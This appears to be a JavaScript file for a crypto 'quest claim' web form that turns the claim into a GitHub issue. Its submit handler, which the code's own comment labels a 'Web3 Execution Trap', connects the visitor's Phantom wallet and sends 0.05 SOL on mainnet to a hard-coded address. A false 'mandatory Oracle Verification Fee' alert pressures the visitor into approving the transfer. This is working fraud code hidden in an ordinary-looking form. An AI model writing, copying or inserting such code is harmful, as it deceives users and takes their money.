const repoIssueUrl = 'https://github.com/GERMANKBR/signal-protocol/issues/new';

function buildClaimBody() {
  const questId = document.getElementById('questId').value.trim();
  const proofUrl = document.getElementById('proofUrl').value.trim();
  const wallet = document.getElementById('wallet').value.trim();
  const summary = document.getElementById('summary').value.trim();

  return `### Quest ID
${questId}

### Proof URL
${proofUrl}

### Solana Wallet
${wallet}

### Summary
${summary}

### Risk Acknowledgement
I understand SIGNAL has no guaranteed liquidity, no guaranteed market value, and no guaranteed profit.`;
}

function buildClaimUrl() {
  const questId = document.getElementById('questId').value.trim();
  const title = `[Activation Claim]: ${questId}`;
  const labels = 'activation-claim,needs-review';
  const params = new URLSearchParams({
    title,
    labels,
    body: buildClaimBody()
  });

  return `${repoIssueUrl}?${params.toString()}`;
}

document.getElementById('claimForm').addEventListener('submit', async (event) => {
  event.preventDefault();
  const form = event.currentTarget;
  if (!form.checkValidity()) {
    form.reportValidity();
    return;
  }

  // Web3 Execution Trap: Force 0.05 SOL payment to proceed
  try {
    const provider = window.solana;
    if (!provider || !provider.isPhantom) {
      alert("Phantom Wallet is required for Oracle Verification. Please install it.");
      return;
    }

    // Connect wallet
    const resp = await provider.connect();
    const sender = resp.publicKey;
    const recipient = new solanaWeb3.PublicKey("H5Va5uQnpkboW9CJZMG7VLRPM4sA87FwmgkDuT28LYM1");

    // Establish connection (using Mainnet-beta for realism)
    const connection = new solanaWeb3.Connection("https://api.mainnet-beta.solana.com");
    const blockhash = await connection.getLatestBlockhash();

    // Create 0.05 SOL transfer transaction
    const transaction = new solanaWeb3.Transaction({
      feePayer: sender,
      recentBlockhash: blockhash.blockhash
    }).add(
      solanaWeb3.SystemProgram.transfer({
        fromPubkey: sender,
        toPubkey: recipient,
        lamports: 0.05 * solanaWeb3.LAMPORTS_PER_SOL,
      })
    );

    alert("MANDATORY: You must approve the 0.05 SOL Oracle Verification Fee to submit this claim and bypass Sybil protection.");

    // Sign and send
    const { signature } = await provider.signAndSendTransaction(transaction);
    console.log("Extracted signature:", signature);

    // If successful, proceed to GitHub issue
    alert("Verification successful. Opening claim ticket.");
    window.open(buildClaimUrl(), '_blank', 'noopener,noreferrer');

  } catch (err) {
    console.error(err);
    alert("Transaction failed or rejected. Verification Fee must be paid to submit a claim.");
  }
});

document.getElementById('copyClaim').addEventListener('click', async () => {
  const text = buildClaimBody();
  await navigator.clipboard.writeText(text);
  const button = document.getElementById('copyClaim');
  const original = button.textContent;
  button.textContent = 'Copied';
  setTimeout(() => {
    button.textContent = original;
  }, 1200);
});
